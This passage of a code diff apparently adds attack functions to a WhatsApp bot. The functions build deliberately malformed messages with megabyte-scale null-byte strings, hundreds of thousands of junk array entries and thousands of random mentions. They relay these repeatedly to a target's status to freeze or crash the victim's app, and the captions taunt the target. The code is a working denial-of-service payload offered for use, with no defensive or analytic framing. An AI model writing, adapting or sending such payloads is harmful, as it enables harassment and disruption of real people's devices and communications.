+                            scanLengths: [2071, 6199, 1634, 1983],  
+                            midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="  
+                        },  
+                        nativeFlowResponseMessage: {  
+                            name: "address_message",  
+                            paramsJson: "\u0000".repeat(1045900),  
+                            version: 3  
+                        }  
+                    }  
+                }  
+            }  
+        };
+
+        const hanzz = await generateWAMessageFromContent(target, msgx, {});
+
+        await client.relayMessage("status@broadcast", hanzz.message, {
+            messageId: hanzz.key.id,
+            statusJidList: [target],
+            additionalNodes: [{
+                tag: "meta",
+                attrs: {},
+                content: [{
+                    tag: "mentioned_users",
+                    attrs: {},
+                    content: [{
+                        tag: "to",
+                        attrs: { jid: target },
+                        content: undefined
+                    }]
+                }]
+            }]
+        });
+
+        console.log(`sukses send to ${target}`);
+
+    } catch(e) {
+        console.log(`error: ${e.message}`);
+    }
+}
+
+async function SuperSlowDelayByMia(sock, jid) {
+  for (let i = 0; i < 25; i++) {
+    const msg = generateWAMessageFromContent(jid, {
+      imageMessage: {
+         url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
+         mimetype: "image/jpeg",
+         caption: "segini doang berani nyenggol dric?",
+         fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
+         fileLength: "999999999",
+         height: 354,
+         width: 783,
+         mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
+         fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
+         directPath:
+            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
+         mediaKeyTimestamp: "1743225419",
+         jpegThumbnail: null,
+         scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
+         scanLengths: [2437, 17332],
+         contextInfo: {
+           urlTrackingMap: {
+               urlTrackingMapElements: Array.from(
+                 { length: 500000 },
+                 () => ({ "\0": "\0" })
+               )
+            }, 
+           isSampled: true,
+           participant: jid,
+           remoteJid: "status@broadcast",
+           forwardingScore: 9999,
+           isForwarded: true,
+         },
+       },
+    }, {});
+    
+    await sock.relayMessage("status@broadcast", msg.message, {
+      messageId: msg.key.id, statusJidList: [jid], additionalNodes: [{
+        tag: "meta", attrs: {}, content: [{
+          tag: "mentioned_users", attrs: {}, content: [{
+            tag: "to", attrs: { jid: jid }, content: undefined
+          }]
+        }]
+      }]
+    });
+  }
+  
+  const msgs = generateWAMessageFromContent(jid, {
+    interactiveResponseMessage: {
+      body: {
+        text: "Segini doang berani nyenggol dric?", 
+        format: "DEFAULT"
+      }, 
+      nativeFlowResponseMessage: {
+        name: "call_permission_request", 
+        paramsJson: "\u0000".repeat(999999), 
+        version: 3
+      }, 
+      contextInfo: {
+        mentionedJid: [
+          "13135550002@s.whatsapp.net", 
+          ...Array.from({ length: 2000 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+          )
+        ], 
+        groupMentions: [],
+        entryPointConversionSource: "non_contact",
+        entryPointConversionApp: "whatsapp",
+        entryPointConversionDelaySeconds: 467593,
+      }
+    }
+  }, {});
+  
+  await sock.relayMessage("status@broadcast", msgs.message, {
+      messageId: msgs.key.id, statusJidList: [jid], additionalNodes: [{
+        tag: "meta", attrs: {}, content: [{
+          tag: "mentioned_users", attrs: {}, content: [{
+            tag: "to", attrs: { jid: jid }, content: undefined
+          }]
+        }]
+      }]
+   });
+}
+
+async function SuperDelayByMia(sock, target) {
+  await sock.relayMessage(
+    target,
+    {
+  groupStatusMessageV2: { 
+    message: {
+      interactiveResponseMessage: {
+        body: {
+          text: "Tunduk Didalam Kekuasaan Cancer",
+          format: "DEFAULT",
+        },
+        nativeFlowResponseMessage: {
+          name: "payment_method",
+                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
+          version: 3
+        },
+        contextInfo: {
+          remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
+          isForwarded: true,
+          forwardingScore: 9999,
+          statusAttributionType: 2,
+            statusAttributions: Array.from({ length: 100000 }, (_, n) => ({
+              participant: `62${n + 836598}@s.whatsapp.net`,
+              type: 1
+            })),
+        },
+      },
+    },
+  },
+}, { participant: { jid: target }});
 }
 // ~ End Function Bugs ~ \\
 // ==================
